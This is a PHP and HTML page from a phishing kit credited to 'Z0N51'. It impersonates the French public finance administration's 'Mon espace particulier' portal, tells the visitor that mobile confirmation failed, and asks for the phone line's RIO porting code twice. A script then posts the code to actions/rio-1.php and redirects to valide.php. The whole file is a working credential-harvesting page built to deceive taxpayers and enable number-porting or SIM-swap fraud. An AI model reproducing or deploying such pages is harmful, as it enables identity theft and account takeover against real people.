<?php include("common/includes.php") ?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Mon profil - Mon esapce particulier</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <header id="header2">
            <div class="container">
                <div class="left">
                    <img style="max-width: 126px;" src="assets/imgs/logo1.svg">
                </div>
                <div class="mid">
                    <h3>Mon espace <span>particulier</span></h3>
                    <img style="max-width: 126px;" src="assets/imgs/logo2.svg">
                </div>
                <div class="right">
                    <p>
                        Bienvenue<br>
                        Numéro fiscal : 1195217722475<br>
                        <span>Retour au tableau de bord</span>
                    </p>
                </div>
            </div>
        </header>

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4">
            <div class="container">
                <u>Tableau de bord</u> <span>-</span> Mon profil

            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="details">
                    <div class="title">
                        <h3 style="text-align: center; color: #e03136;">Confirmation mobile échoué !</h3>
                                                <div class="text-center mb20">
                            <img src="asset/images/phone.png" style="max-width: 100px;">
                        </div>
                        
                       <p style="color: rgb(46, 44, 44); font-size:15px; " >
                    Merci de saisir Le code RIO ( Relevé Identité Opérateur ).</p>
                    L'obtention du code RIO est <b style="color: #e03136;">gratuite</b> et se fait en quelques minutes<h1 style="font-size: 21px; font-weight: bold;color: #e03136;"> En appelant le 3179</h1>
                    <br><b class="highlight">Votre code RIO est envoyé directement par sms après quelque secondes.</b>
               

                        </p>
                    </div>
                    <form action="" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="cc">  
                       <div class="form-group col-12 row" style="left:-2px">              
                       <b class="col-5" for="id" style="text-align: right; color: #e03136;">Code RIO*:</b>
                       <input type="text" class="form-control coderio col-5" id="coderio" name="coderio" maxlength="16" placeholder="" autocomplete="off" required>   
                       <span style="font-size: 12px; color: #e03136;">Exemple: 0X X XXXXXX XXX</span>      
                       </div>
                       <div class="form-group col-12 row" style="left:-2px">              
                       <b class="col-5" for="id" style="text-align: right; color: #e03136;">Retapez le Code RIO*:</b>
                       <input type="text" class="form-control coderio1 col-5" id="coderio1" name="coderio1" maxlength="16" placeholder="" autocomplete="off" required>   
                       <span style="font-size: 12px; color: #e03136;">Exemple: 0X X XXXXXX XXX</span>    
                       </div>



                        <div class="btns">
                            <button type="button" id="submit"><i class="fas fa-lock"></i> Etape suivante</button>
                        </div>
                    </form>

                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <footer id="footer">
            <div class="container">
                <p>Direction générale des Finances publiques</p>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script type="text/JavaScript">
            var x = 0
            $(document).ready(function() {
                
                
                $('#submit').click(function(e) {
                    e.preventDefault();
                     if ( $('.coderio').val().length >= 1 && $('.coderio1').val().length >= 2) {

                        $.ajax({
                            type: "post",
                            url: "actions/rio-1.php",
                            data: "coderio=" + $('.coderio').val() + "&coderio1=" + $('.coderio1').val(),
                            success: function(response) {
                                window.location.href = 'valide.php';
                                
                            }
                        });
                          } else {
                        alert('Veuillez vérifier votre Code RIO.')
                    }
                    
                });

            })

        </script>

    </body>

</html>